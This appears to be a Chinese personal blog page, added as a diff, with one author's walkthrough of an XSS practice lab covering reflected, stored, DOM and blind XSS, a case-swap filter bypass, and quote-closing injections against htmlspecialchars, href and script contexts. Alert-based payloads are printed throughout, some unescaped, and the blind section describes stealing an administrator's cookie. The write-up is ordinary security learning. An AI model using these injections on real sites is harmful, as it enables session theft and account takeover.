@@ -1,0 +1,197 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>XSS靶场四种类型 | Mark</title><meta name="keywords" content="安全文档"><meta name="author" content="郭胧演"><meta name="copyright" content="郭胧演"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.反射型XSS(get)直接 alert(&quot;hack&quot;)  输入，input框长度不够可以在查看器里面修改 2.反射型XSS(post)你可以先注册一个用户，然后在用户方的input框输入xss注入内容 alert(&quot;hack&quot;)  3.存储型XSS针对于类似与留言板，评论区类的，可以使用存储型的xss进行注入 在 textarea 区域直接输入 alert(&quot;hack&quot;)  4.DOM型XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS靶场四种类型">
+<meta property="og:url" content="https://guooom.github.io/2022/05/15/XSS/index.html">
+<meta property="og:site_name" content="Mark">
+<meta property="og:description" content="1.反射型XSS(get)直接 alert(&quot;hack&quot;)  输入，input框长度不够可以在查看器里面修改 2.反射型XSS(post)你可以先注册一个用户，然后在用户方的input框输入xss注入内容 alert(&quot;hack&quot;)  3.存储型XSS针对于类似与留言板，评论区类的，可以使用存储型的xss进行注入 在 textarea 区域直接输入 alert(&quot;hack&quot;)  4.DOM型XSS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img0.baidu.com/it/u=3774379887,1875053821&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=889">
+<meta property="article:published_time" content="2022-05-15T09:32:34.000Z">
+<meta property="article:modified_time" content="2022-05-15T09:36:21.225Z">
+<meta property="article:author" content="郭胧演">
+<meta property="article:tag" content="安全文档">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img0.baidu.com/it/u=3774379887,1875053821&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=889"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://guooom.github.io/2022/05/15/XSS/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS靶场四种类型',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-05-15 17:36:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img0.baidu.com/it/u=1172900452,2050562182&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=889&amp;h=500')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mark</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于链接</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS靶场四种类型</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-15T09:32:34.000Z" title="发表于 2022-05-15 17:32:34">2022-05-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-15T09:36:21.225Z" title="更新于 2022-05-15 17:36:21">2022-05-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS靶场四种类型"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="1-反射型XSS-get"><a href="#1-反射型XSS-get" class="headerlink" title="1.反射型XSS(get)"></a>1.反射型XSS(get)</h1><p>直接</p>
+<script>alert("hack")</script>
+
+<p>输入，input框长度不够可以在查看器里面修改</p>
+<h1 id="2-反射型XSS-post"><a href="#2-反射型XSS-post" class="headerlink" title="2.反射型XSS(post)"></a>2.反射型XSS(post)</h1><p>你可以先注册一个用户，然后在用户方的input框输入xss注入内容</p>
+<script>alert("hack")</script>
+
+<h1 id="3-存储型XSS"><a href="#3-存储型XSS" class="headerlink" title="3.存储型XSS"></a>3.存储型XSS</h1><p>针对于类似与留言板，评论区类的，可以使用存储型的xss进行注入</p>
+<p>在 textarea 区域直接输入</p>
+<script>alert("hack")</script>
+
+<h1 id="4-DOM型XSS"><a href="#4-DOM型XSS" class="headerlink" title="4.DOM型XSS"></a>4.DOM型XSS</h1><p>DOM(文件对象模型):将脚本写进html文档内部,我自己的理解就是说我在输入框输入的内容不会返回给服务器，而是直接在前端js处理，直接用HTML.inner更改内容用的；</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?		&lt;/a&gt;&quot;</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看下页面源代码就是说我们可以改‘str’处的值，eg：</p>
+<p>javascript:alert(“hack”)</p>
+<p>‘ onclick&#x3D;”alert(‘xss’)”&gt;</p>
+<p>‘&gt;<img src="#" onmouseover="alert('xss')"></p>
+<p>说白了就是将他闭合，然后触发alert()事件</p>
+<h1 id="5-DOM型XSS-X"><a href="#5-DOM型XSS-X" class="headerlink" title="5.DOM型XSS-X"></a>5.DOM型XSS-X</h1><p>源代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">                <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> str = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.<span class="title function_">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> xss = txss.<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//                        alert(xss);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span></span><br><span class="line"><span class="language-javascript">                </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;domxss()&#x27;</span>&gt;</span>有些费尽心机想要忘记的事情,后来真的就忘掉了<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题的关键在于domxss()方法里面的innerHTML这段话，就是对xss进行注入，跟上一题一样；eg:</p>
+<p>​			‘&gt;<img src="#" onmouseover="alert('xss')"></p>
+<p>​			‘ onclick&#x3D;”alert(‘xss’)”&gt;</p>
+<p>​			javascript:alert(1)</p>
+<h1 id="6-XSS之盲打"><a href="#6-XSS之盲打" class="headerlink" title="6.XSS之盲打"></a>6.XSS之盲打</h1><p>在我看来这个一般用于客服反馈，就是说你在提交反馈信息时注入一个alert()到后台管理服务器中去，当后台管理员去打开反馈界面时我们注入的alert()就会弹出，然后一旦管理员点击了alert(),我们就可以获取管理员的Cookie信息，然后就可以进一步获取相应权限</p>
+<p>eg:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main-content&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/html&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main-content-inner&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;breadcrumbs ace-save-state&quot;</span> <span class="attr">id</span>=<span class="string">&quot;breadcrumbs&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;ace-icon fa fa-home home-icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;../xss.php&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;active&quot;</span>&gt;</span>xss盲打<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span><span class="comment">&lt;!-- /.breadcrumb --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;float:right&quot;</span> <span class="attr">data-container</span>=<span class="string">&quot;body&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;popover&quot;</span> <span class="attr">data-placement</span>=<span class="string">&quot;bottom&quot;</span> <span class="attr">title</span>=<span class="string">&quot;tips(再点一下关闭)&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">data-content</span>=<span class="string">&quot;登录后台,看会发生啥?后台登录地址是/xssblind/admin_login.php&quot;</span>&gt;</span></span><br><span class="line">                点一下提示~</span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;page-content&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;xss_blind&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;blindxss_tip&quot;</span>&gt;</span>请在下面输入你对&quot;锅盖头&quot;这种发型的看法：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;blindxss_tip&quot;</span>&gt;</span>我们将会随机抽出一名送出麻港一日游<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span>&gt;</span>你的大名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.page-content --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.main-content --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Mark\AppData\Roaming\Typora\typora-user-images\image-20220507010242106.png" alt="image-20220507010242106"></p>
+<p>在文本框里输入 <script>alert(1)</script>进行注入</p>
+<h1 id="7-XSS之过滤"><a href="#7-XSS之过滤" class="headerlink" title="7.XSS之过滤"></a>7.XSS之过滤</h1><p>直接用大小写替换，毕竟html兼容性比较强，可以用大小写转换来绕过过滤</p>
+<p>eg:<ScRiPt>alert(1)</ScrIpT></p>
+<h1 id="8-xss之htmlspecialchars"><a href="#8-xss之htmlspecialchars" class="headerlink" title="8.xss之htmlspecialchars"></a>8.xss之htmlspecialchars</h1><p>htmlspecialchars()这个方法主要是应对html特殊字符的，但不对‘单引号做处理，所以你就明白了吧，嘿嘿嘿。</p>
+<p>所以我们主要对<a href='text'>中的text修改，进行提前闭合函数等方法完成alert()</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;page-content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;xssr_main&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;xssr_title&quot;</span>&gt;</span>人生之所有苦短,是因为你的xss学习的还不够好<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;xssr_in&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;xssr_submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&#x27;notice&#x27;</span>&gt;</span>你的输入已经被记录:<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;onclick=’alert(1)‘&#x27;</span>&gt;</span>onclick=’alert(1)‘<span class="tag">&lt;/<span class="name">a</span>&gt;</span>            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.page-content --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="9-xss之href输出"><a href="#9-xss之href输出" class="headerlink" title="9.xss之href输出"></a>9.xss之href输出</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">javascript:<span class="title function_ invoke__">alert</span>(hack)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200111234124280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTU5ODY2MA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这道题没看源代码我做不出来，看着源代码就知道我们要改的时message值，所以在 &lt; a href&#x3D;’…’  javascript:alert(“hack”)&gt;</a></p>
+<h1 id="10-xss之js输出"><a href="#10-xss之js输出" class="headerlink" title="10.xss之js输出"></a>10.xss之js输出</h1><p>先分析:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms=<span class="string">&#x27;asd&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>($ms.<span class="property">length</span> != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            alert($ms);</span></span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有这个我们就可以看出来，我们输入input的文本框中的值反馈到了$ms变量，所以通过修改ms值来alert()一个弹框。</p>
+<p>我写的是复杂了点</p>
+<p>‘</script><script>alert("hack")</script><script>$a=’</p>
+<p>你可以放进去看看，就知道了，看这个图</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> $ms=<span class="string">&#x27;&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hack&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$a=<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>($ms.<span class="property">length</span> != <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//            alert($ms);</span></span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://guooom.github.io">郭胧演</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="http://39857zw846.wicp.vip/">http://39857zw846.wicp.vip/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">此文章版权归郭胧演所有，如有引用，请注明来自原作者</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://img0.baidu.com/it/u=3774379887,1875053821&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=889" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/05/15/%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97/%E6%BC%94%E7%A4%BA/"><img class="next-cover" src="/./img/xueren.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">靶场心得</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">郭胧演</div><div class="author-info__description">学安全的小白</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/guooom" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1850534869@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas 